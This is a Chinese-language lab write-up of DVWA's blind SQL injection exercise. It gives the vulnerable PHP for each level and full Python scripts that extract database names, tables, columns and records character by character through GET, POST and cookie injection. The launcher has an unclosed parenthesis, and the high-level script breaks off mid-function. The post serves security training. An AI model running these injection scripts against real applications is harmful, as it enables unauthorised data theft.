---
title: DVWA-SQL_Injection_Blind（sql盲注）
date: 2019-11-12 20:26:23
tags: [sql注入]
categories: sql注入
---

DVWA的sql盲注。

<!--more-->

SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。

```swift
盲注中常用的几个函数：
substr(a,b,c)：从b位置开始，截取字符串a的c长度 
count()：计算总数 
ascii()：返回字符的ascii码 
length()：返回字符串的长度 left(a,b)：从左往右截取字符串a的前b个字符 
sleep(n):将程序挂起n秒
```

 **手工盲注思路** 

手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。

盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注，这里只演示基于布尔的盲注与基于时间的盲注。

```undefined
下面简要介绍手工盲注的步骤（可与之前的手工注入作比较）：
1.判断是否存在注入，注入是字符型还是数字型 
2.猜解当前数据库名 
3.猜解数据库中的表名
4.猜解表中的字段名 
5.猜解数据
```

## 级别：low

### **SQL Injection (Blind) Source**

```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Get input
    $id = $_GET[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

###  **分析：** 

 Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种： 

` User ID exists in the database.与 User ID is MISSING from the database. `

 所以这里是SQL盲注漏洞。 

###   **漏洞利用** 

 输入1 ，发现 

![M8pniV.png](https://s2.ax1x.com/2019/11/12/M8pniV.png)

 输入 1'， 发现 

![M8CxaR.png](https://s2.ax1x.com/2019/11/12/M8CxaR.png)



 观察到他这里只会出现正确或者错误的两种页面，判定他是一个布尔盲注 

###  获取数据库长度 

```python
    def get_database_length(self):
        self.database_length = 0
        for i in range(1,30):
            self.process('get_database_length',i,30)
            theurl = self.url + "1' and length(database())={0}%23".format(str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.database_length = i
                break
        if self.database_length > 0:
            print('\n==>',self.database_length)
        else:
            print("\ncan not get the database_length")
```

运行结果：

![MGOfVP.png](https://s2.ax1x.com/2019/11/13/MGOfVP.png)

### 检查页面是否正常

```python
 def check(self,text):
        if "User ID exists in the database." in text:
            return True
        elif "User ID is MISSING from the database." in text:
            return False
```

### 获取数据库名

```python
    def get_database(self):
        self.database = ''
        for i in range(1,self.database_length+1):
            for j in self.zifuji:
                self.process(str(i) + ' get_database',j,self.database_length+1)
                theurl = self.url + "1' and ascii(substring(database(),{0},1))={1}%23".format(str(i),str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    self.database += chr(j)
                    break
            if len(self.database) != i:
                self.database += '666'
        if len(self.database) > 0:
            print('\n==>',self.database)
        else:
            print("\n can not get the database")
```

运行结果：

![MGjklQ.png](https://s2.ax1x.com/2019/11/13/MGjklQ.png)

### 获取表长

```python
    def get_table_length(self):
        for i in range(1,50):
            self.process('get_table_length',i,50)
            theurl = self.url + "1' and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a={0})%23".format(str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.table_length.append(i)
                break
        if self.table_length[0] > 0:
            print('\n==>',self.table_length)
        else:
            print('\ncan not get the table_length')
```

运行结果：

![MGjdfO.png](https://s2.ax1x.com/2019/11/13/MGjdfO.png)

### 获取表名

```python
    def get_table_name(self):
        name = ''
        for i in range(1,self.table_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_table_name'.format(i),j,50)
                theurl = self.url + "1' and (select ascii(substring(group_concat(table_name),{0},1)) as a from information_schema.tables where table_schema=database() having a={1})%23".format(str(i),str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) > 0:
            print('\n==>',name)
            self.table_name.append(name)
        else:
            print('\ncan not get the table_name')
```

运行结果：

![MJie0g.png](https://s2.ax1x.com/2019/11/13/MJie0g.png)

### 获取表列数量

```python
    def get_column_num(self,table_name):
        self.column_num = 0
        for i in range(1,30):
            self.process('get_column_num',i,30)
            theurl = self.url + "1' and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name='{0}' having a={1})%23".format(table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.column_num = i
                break
        if self.column_num > 0:
            print('\n==>',self.column_num)
```

### 获取总长度

```python
    def get_column_length(self,table_name):
        for i in range(1,100):
            self.process('get_column_length',i,100)
            theurl = self.url + "1' and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name='{0}' having a={1})%23".format(table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.column_length.append(i)
                break
        if len(self.column_length) >= 1:
            print('\n==>',self.column_length)
        else:
            print('\ncan not get the column_length')
```

### 获取列名

```python
    def get_column_name(self,table_name):
        name = ''
        for i in range(1,self.column_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_column_name'.format(str(i)),j,100)
                theurl = self.url + "1' and (select ascii(substring(group_concat(column_name),{0},1)) as a from information_schema.columns where table_schema=database() and table_name='{1}' having a={2})%23".format(str(i),table_name,str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) == self.column_length[0]:
            self.column_name.append(name)
            print('\n==>',self.column_name[0])
        else:
            print('\ncan not get the column_name')
```

运行结果：

![MJFlUH.png](https://s2.ax1x.com/2019/11/13/MJFlUH.png)

### 获取字段数目

```python
    def get_word_num(self,table_name,column_name):
        for i in range(1,100):
            self.process('get_word_num',i,30)
            theurl = self.url + "1' and (select count({0}) as a from {1} having a={2})%23".format(column_name,table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.word_num = i
                break
        if self.word_num > 0:
            print('\n==>',self.word_num)
        else:
            print('\ncan not get the word_num')
```

### 获取列长

```python
    def get_word_length(self,table_name,column_name):
        for i in range(1,200):
            self.process('get_{0}_length'.format(column_name),i,200)
            theurl = self.url + "1' and (select length(group_concat({0})) as a from {1} having a={2})%23".format(column_name,table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.word_length.append(i)
                break
        if len(self.word_length) >= 1:
            print('\n==>',self.word_length)
        else:
            print('\ncan not get the word length') 
```

### 获取数据

```python
    def get_word_name(self,table_name,column_name,word_num):
        name = ''
        for i in range(1,self.word_length[word_num]+1):
            for j in self.zifuji:
                self.process('get_{0}_name'.format(str(i)),j,100)
                theurl = self.url + "1' and (select ascii(substring(group_concat({0}),{1},1)) as a from {2} having a={3})%23".format(column_name,str(i),table_name,str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        self.word_name.append(name)
        print('\n==>',self.word_name[word_num])
```

运行结果：

![MJAW4J.png](https://s2.ax1x.com/2019/11/13/MJAW4J.png)

## 级别：medium

###  SQL Injection (Blind) Source

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $id = $_POST[ 'id' ];
    $id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    //mysql_close();
}

?>
```

### 分析

medium级别与low级别差不多， 将get方式改成post方式即可，数字型注入。

由于他会过滤单引号，所以需要转成16进制。

```python
 def tranhex(self,str1):
        result = '0x'
        for i in str1:
            result += hex(ord(i))[2:]
        return result
```

运行结果：

![MJmPQs.png](https://s2.ax1x.com/2019/11/13/MJmPQs.png)

![MJmaSH.png](https://s2.ax1x.com/2019/11/13/MJmaSH.png)

## 级别：high

### SQL Injection (Blind) Source

```php
<?php

if( isset( $_COOKIE[ 'id' ] ) ) {
    // Get input
    $id = $_COOKIE[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Might sleep a random amount
        if( rand( 0, 5 ) == 3 ) {
            sleep( rand( 2, 4 ) );
        }

        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

### 分析

随便写个1提交

![MJunM9.png](https://s2.ax1x.com/2019/11/13/MJunM9.png)

 是一个cookie注入 

![MJuLLR.png](https://s2.ax1x.com/2019/11/13/MJuLLR.png)

```python
    def get_headers(self,payload):
        headers = {
            'Cookie': "id={0}; security=high; PHPSESSID=ms11imgpftrmfcp27rmk9s006c".format(payload)
        }
```

运行结果：

![MYZAMR.png](https://s2.ax1x.com/2019/11/13/MYZAMR.png)

## 完整脚本

```python 
from Injection import Injection

def main(url):
    Injection(url).run()

if __name__ == '__main__':
    url = "http://192.168.74.1/DVWA/vulnerabilities/sqli_blind/?id="
    main(url
```

### low:

```python
import requests
import string

class Injection:
    def __init__(self,url):
        self.url = url
        self.s = requests.session()
        self.zifuji = [44,48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 95, 45, 64, 33, 38, 36]
        self.headers = {
            'Cookie': 'security=low; PHPSESSID=ms11imgpftrmfcp27rmk9s006c'
        }
    def process(self,yourstr,num1,num2):
        print("[+] Please wait ... {0} [{1}]/[{2}]".format(yourstr,str(num1),str(num2)),end='\r')
    def check(self,text):
        if "User ID exists in the database." in text:
            return True
        elif "User ID is MISSING from the database." in text:
            return False
    def run(self):
        self.get_itsnum()
        self.get_database_length()
        self.get_database()
        self.get_table_num()
        self.table_length = []
        self.table_name = []
        self.get_table_length()
        self.get_table_name()
        table_name = input('[-] table_name: ')
        self.get_column_num(table_name)
        self.column_length = []
        self.column_name = []
        self.get_column_length(table_name)
        self.get_column_name(table_name)
        column_names = input('[-] column_name: ').split(',')
        self.word_num = 0
        self.get_word_num(table_name,column_names[0])
        self.word_name = []
        self.word_length = []
        for i in range(len(column_names)):
            print(column_names[i])
            self.get_word_length(table_name,column_names[i])
            self.get_word_name(table_name,column_names[i],i)
        
    def get_itsnum(self):
        self.itsnum = 0
        for i in range(1,50):
            self.process('get_itsnum',i,50)
            theurl = self.url + "1' order by {0}%23".format(str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if not self.check(html):
                self.itsnum = i - 1
                break
        if self.itsnum > 0:
            print('\n==>',self.itsnum)
        else:
            print("\ncan not get the itsnum")
    def get_database_length(self):
        self.database_length = 0
        for i in range(1,30):
            self.process('get_database_length',i,30)
            theurl = self.url + "1' and length(database())={0}%23".format(str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.database_length = i
                break
        if self.database_length > 0:
            print('\n==>',self.database_length)
        else:
            print("\ncan not get the database_length")
    def get_database(self):
        self.database = ''
        for i in range(1,self.database_length+1):
            for j in self.zifuji:
                self.process(str(i) + ' get_database',j,self.database_length+1)
                theurl = self.url + "1' and ascii(substring(database(),{0},1))={1}%23".format(str(i),str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    self.database += chr(j)
                    break
            if len(self.database) != i:
                self.database += '666'
        if len(self.database) > 0:
            print('\n==>',self.database)
        else:
            print("\n can not get the database")
    def get_table_num(self):
        self.table_num = 0
        for i in range(1,30):
            self.process('get_table_num',i,30)
            theurl = self.url + "1' and (select count(table_name)a from information_schema.tables where table_schema=database() having a={0})%23".format(str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.table_num = i
                break
        if self.table_num > 0:
            print('\n==>',self.table_num)
        else:
            print("\ncan not get the table_num")           
    def get_table_length(self):
        for i in range(1,50):
            self.process('get_table_length',i,50)
            theurl = self.url + "1' and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a={0})%23".format(str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.table_length.append(i)
                break
        if self.table_length[0] > 0:
            print('\n==>',self.table_length)
        else:
            print('\ncan not get the table_length')
    def get_table_name(self):
        name = ''
        for i in range(1,self.table_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_table_name'.format(i),j,50)
                theurl = self.url + "1' and (select ascii(substring(group_concat(table_name),{0},1)) as a from information_schema.tables where table_schema=database() having a={1})%23".format(str(i),str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) > 0:
            print('\n==>',name)
            self.table_name.append(name)
        else:
            print('\ncan not get the table_name')
    def get_column_num(self,table_name):
        self.column_num = 0
        for i in range(1,30):
            self.process('get_column_num',i,30)
            theurl = self.url + "1' and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name='{0}' having a={1})%23".format(table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.column_num = i
                break
        if self.column_num > 0:
            print('\n==>',self.column_num)
    def get_column_length(self,table_name):
        for i in range(1,100):
            self.process('get_column_length',i,100)
            theurl = self.url + "1' and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name='{0}' having a={1})%23".format(table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.column_length.append(i)
                break
        if len(self.column_length) >= 1:
            print('\n==>',self.column_length)
        else:
            print('\ncan not get the column_length')
    def get_column_name(self,table_name):
        name = ''
        for i in range(1,self.column_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_column_name'.format(str(i)),j,100)
                theurl = self.url + "1' and (select ascii(substring(group_concat(column_name),{0},1)) as a from information_schema.columns where table_schema=database() and table_name='{1}' having a={2})%23".format(str(i),table_name,str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) == self.column_length[0]:
            self.column_name.append(name)
            print('\n==>',self.column_name[0])
        else:
            print('\ncan not get the column_name')
    def get_word_num(self,table_name,column_name):
        for i in range(1,100):
            self.process('get_word_num',i,30)
            theurl = self.url + "1' and (select count({0}) as a from {1} having a={2})%23".format(column_name,table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.word_num = i
                break
        if self.word_num > 0:
            print('\n==>',self.word_num)
        else:
            print('\ncan not get the word_num')
    def get_word_length(self,table_name,column_name):
        for i in range(1,200):
            self.process('get_{0}_length'.format(column_name),i,200)
            theurl = self.url + "1' and (select length(group_concat({0})) as a from {1} having a={2})%23".format(column_name,table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.word_length.append(i)
                break
        if len(self.word_length) >= 1:
            print('\n==>',self.word_length)
        else:
            print('\ncan not get the word length') 
    def get_word_name(self,table_name,column_name,word_num):
        name = ''
        for i in range(1,self.word_length[word_num]+1):
            for j in self.zifuji:
                self.process('get_{0}_name'.format(str(i)),j,100)
                theurl = self.url + "1' and (select ascii(substring(group_concat({0}),{1},1)) as a from {2} having a={3})%23".format(column_name,str(i),table_name,str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        self.word_name.append(name)
        print('\n==>',self.word_name[word_num])
```

### medium

```python
import requests
import string

class Injection:
    def __init__(self,url):
        self.url = url
        self.s = requests.session()
        self.zifuji = [44,48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 95, 45, 64, 33, 38, 36]
        self.headers = {
            'Cookie': 'security=medium; PHPSESSID=ms11imgpftrmfcp27rmk9s006c'
        }
    def process(self,yourstr,num1,num2):
        print("[+] Please wait ... {0} [{1}]/[{2}]".format(yourstr,str(num1),str(num2)),end='\r')
    def check(self,text):
        if "User ID exists in the database." in text:
            return True
        elif "User ID is MISSING from the database." in text:
            return False
    def tranhex(self,str1):
        result = '0x'
        for i in str1:
            result += hex(ord(i))[2:]
        return result
    def run(self):
        self.get_itsnum()
        self.get_database_length()
        self.get_database()
        self.get_table_num()
        self.table_length = []
        self.table_name = []
        self.get_table_length()
        self.get_table_name()
        table_name = input('[-] table_name: ')
        self.get_column_num(table_name)
        self.column_length = []
        self.column_name = []
        self.get_column_length(table_name)
        self.get_column_name(table_name)
        column_names = input('[-] column_name: ').split(',')
        self.word_num = 0
        self.get_word_num(table_name,column_names[0])
        self.word_name = []
        self.word_length = []
        for i in range(len(column_names)):
            print(column_names[i])
            self.get_word_length(table_name,column_names[i])
            self.get_word_name(table_name,column_names[i],i)
        
    def get_itsnum(self):
        self.itsnum = 0
        for i in range(1,50):
            self.process('get_itsnum',i,50)
            data = {
                'id':"1 order by {0}".format(str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if not self.check(html):
                self.itsnum = i - 1
                break
        if self.itsnum > 0:
            print('\n==>',self.itsnum)
        else:
            print("\ncan not get the itsnum")
    def get_database_length(self):
        self.database_length = 0
        for i in range(1,30):
            self.process('get_database_length',i,30)
            data = {
                'id':"1 and length(database())={0}".format(str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if self.check(html):
                self.database_length = i
                break
        if self.database_length > 0:
            print('\n==>',self.database_length)
        else:
            print("\ncan not get the database_length")
    def get_database(self):
        self.database = ''
        for i in range(1,self.database_length+1):
            for j in self.zifuji:
                self.process(str(i) + ' get_database',j,self.database_length+1)
                data = {
                    'id':"1 and ascii(substring(database(),{0},1))={1}".format(str(i),str(j)),
                    'Submit':'Submit',
                }
                html = self.s.post(self.url,data=data,headers=self.headers).text
                if self.check(html):
                    self.database += chr(j)
                    break
            if len(self.database) != i:
                self.database += '666'
        if len(self.database) > 0:
            print('\n==>',self.database)
        else:
            print("\n can not get the database")
    def get_table_num(self):
        self.table_num = 0
        for i in range(1,30):
            self.process('get_table_num',i,30)
            data = {
                'id':"1 and (select count(table_name)a from information_schema.tables where table_schema=database() having a={0})".format(str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if self.check(html):
                self.table_num = i
                break
        if self.table_num > 0:
            print('\n==>',self.table_num)
        else:
            print("\ncan not get the table_num")           
    def get_table_length(self):
        for i in range(1,50):
            self.process('get_table_length',i,50)
            data = {
                'id':"1 and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a={0})".format(str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if self.check(html):
                self.table_length.append(i)
                break
        if self.table_length[0] > 0:
            print('\n==>',self.table_length)
        else:
            print('\ncan not get the table_length')
    def get_table_name(self):
        name = ''
        for i in range(1,self.table_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_table_name'.format(i),j,50)
                data = {
                    'id':"1 and (select ascii(substring(group_concat(table_name),{0},1)) as a from information_schema.tables where table_schema=database() having a={1})".format(str(i),str(j)),
                    'Submit':'Submit',
                }
                html = self.s.post(self.url,data=data,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) > 0:
            print('\n==>',name)
            self.table_name.append(name)
        else:
            print('\ncan not get the table_name')
    def get_column_num(self,table_name):
        self.column_num = 0
        table_name = self.tranhex(table_name)
        print(table_name)
        for i in range(1,30):
            self.process('get_column_num',i,30)
            data = {
                'id':"1 and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name={0} having a={1})".format(table_name,str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if self.check(html):
                self.column_num = i
                break
        if self.column_num > 0:
            print('\n==>',self.column_num)
    def get_column_length(self,table_name):
        table_name = self.tranhex(table_name)
        for i in range(1,100):
            self.process('get_column_length',i,100)
            data = {
                'id':"1 and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name={0} having a={1})".format(table_name,str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if self.check(html):
                self.column_length.append(i)
                break
        if len(self.column_length) >= 1:
            print('\n==>',self.column_length)
        else:
            print('\ncan not get the column_length')
    def get_column_name(self,table_name):
        table_name = self.tranhex(table_name)
        name = ''
        for i in range(1,self.column_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_column_name'.format(str(i)),j,100)
                data = {
                    'id':"1 and (select ascii(substring(group_concat(column_name),{0},1)) as a from information_schema.columns where table_schema=database() and table_name={1} having a={2})".format(str(i),table_name,str(j)),
                    'Submit':'Submit',
                }
                html = self.s.post(self.url,data=data,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) == self.column_length[0]:
            self.column_name.append(name)
            print('\n==>',self.column_name[0])
        else:
            print('\ncan not get the column_name')
    def get_word_num(self,table_name,column_name):
        for i in range(1,100):
            self.process('get_word_num',i,30)
            data = {
                'id':"1 and (select count({0}) as a from {1} having a={2})".format(column_name,table_name,str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if self.check(html):
                self.word_num = i
                break
        if self.word_num > 0:
            print('\n==>',self.word_num)
        else:
            print('\ncan not get the word_num')
    def get_word_length(self,table_name,column_name):
        for i in range(1,200):
            self.process('get_{0}_length'.format(column_name),i,200)
            data = {
                'id':"1 and (select length(group_concat({0})) as a from {1} having a={2})".format(column_name,table_name,str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if self.check(html):
                self.word_length.append(i)
                break
        if len(self.word_length) >= 1:
            print('\n==>',self.word_length)
        else:
            print('\ncan not get the word length') 
    def get_word_name(self,table_name,column_name,word_num):
        name = ''
        for i in range(1,self.word_length[word_num]+1):
            for j in self.zifuji:
                self.process('get_{0}_name'.format(str(i)),j,100)
                data = {
                    'id':"1 and (select ascii(substring(group_concat({0}),{1},1)) as a from {2} having a={3})".format(column_name,str(i),table_name,str(j)),
                    'Submit':'Submit',
                }
                html = self.s.post(self.url,data=data,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        self.word_name.append(name)
        print('\n==>',self.word_name[word_num])
```

### high

```python
import requests
import string

class Injection:
    def __init__(self,url):
        self.url = url
        self.s = requests.session()
        self.zifuji = [44,48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 95, 45, 64, 33, 38, 36]
    def get_headers(self,payload):
        headers = {
            'Cookie': "id={0}; security=high; PHPSESSID=ms11imgpftrmfcp27rmk9s006c".format(payload)
        }
        return headers
    def process(self,yourstr,num1,num2):
        print("[+] Please wait ... {0} [{1}]/[{2}]".format(yourstr,str(num1),str(num2)),end='\r')
    def check(self,text):
        if "User ID exists in the database." in text:
            return True
        elif "User ID is MISSING from the database." in text:
            return False
    def run(self):
        self.get_itsnum()
        self.get_database_length()
        self.get_database()
        self.get_table_num()
        self.table_length = []
        self.table_name = []
        self.get_table_length()
        self.get_table_name()
        table_name = input('[-] table_name: ')
        self.get_column_num(table_name)
        self.column_length = []
        self.column_name = []
        self.get_column_length(table_name)
        self.get_column_name(table_name)
        column_names = input('[-] column_name: ').split(',')
        self.word_num = 0
        self.get_word_num(table_name,column_names[0])
        self.word_name = []
        self.word_length = []
        for i in range(len(column_names)):
            print(column_names[i])
            self.get_word_length(table_name,column_names[i])
            self.get_word_name(table_name,column_names[i],i)
        
    def get_itsnum(self):
        self.itsnum = 0
        for i in range(1,50):
            self.process('get_itsnum',i,50)
            payload = "1' order by {0}#".format(str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if not self.check(html):
                self.itsnum = i - 1
                break
        if self.itsnum > 0:
            print('\n==>',self.itsnum)
        else:
            print("\ncan not get the itsnum")
    def get_database_length(self):
        self.database_length = 0
        for i in range(1,30):
            self.process('get_database_length',i,30)
            payload = "1' and length(database())={0}#".format(str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if self.check(html):
                self.database_length = i
                break
        if self.database_length > 0:
            print('\n==>',self.database_length)
        else:
            print("\ncan not get the database_length")
    def get_database(self):
        self.database = ''
        for i in range(1,self.database_length+1):
            for j in self.zifuji:
                self.process(str(i) + ' get_database',j,self.database_length+1)
                payload = "1' and ascii(substring(database(),{0},1))={1}#".format(str(i),str(j))
                html = self.s.get(self.url,headers=self.get_headers(payload)).text
                if self.check(html):
                    self.database += chr(j)
                    break
            if len(self.database) != i:
                self.database += '666'
        if len(self.database) > 0:
            print('\n==>',self.database)
        else:
            print("\n can not get the database")
    def get_table_num(self):
        self.table_num = 0
        for i in range(1,30):
            self.process('get_table_num',i,30)
            payload = "1' and (select count(table_name)a from information_schema.tables where table_schema=database() having a={0})#".format(str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if self.check(html):
                self.table_num = i
                break
        if self.table_num > 0:
            print('\n==>',self.table_num)
        else:
            print("\ncan not get the table_num")           
    def get_table_length(self):
        for i in range(1,50):
            self.process('get_table_length',i,50)
            payload = "1' and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a={0})#".format(str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if self.check(html):
                self.table_length.append(i)
                break
        if self.table_length[0] > 0:
            print('\n==>',self.table_length)
        else:
            print('\ncan not get the table_length')
    def get_table_name(self):
        name = ''
        for i in range(1,self.table_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_table_name'.format(i),j,50)
                payload = "1' and (select ascii(substring(group_concat(table_name),{0},1)) as a from information_schema.tables where table_schema=database() having a={1})#".format(str(i),str(j))
                html = self.s.get(self.url,headers=self.get_headers(payload)).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) > 0:
            print('\n==>',name)
            self.table_name.append(name)
        else:
            print('\ncan not get the table_name')
    def get_column_num(self,table_name):
        self.column_num = 0
        for i in range(1,30):
            self.process('get_column_num',i,30)
            payload = "1' and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name='{0}' having a={1})#".format(table_name,str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if self.check(html):
                self.column_num = i
                break
        if self.column_num > 0:
            print('\n==>',self.column_num)
    def get_column_length(self,table_name):
        for i in range(1,100):
            self.process('get_column_length',i,100)
            payload = "1' and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name='{0}' having a={1})#".format(table_name,str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if self.check(html):
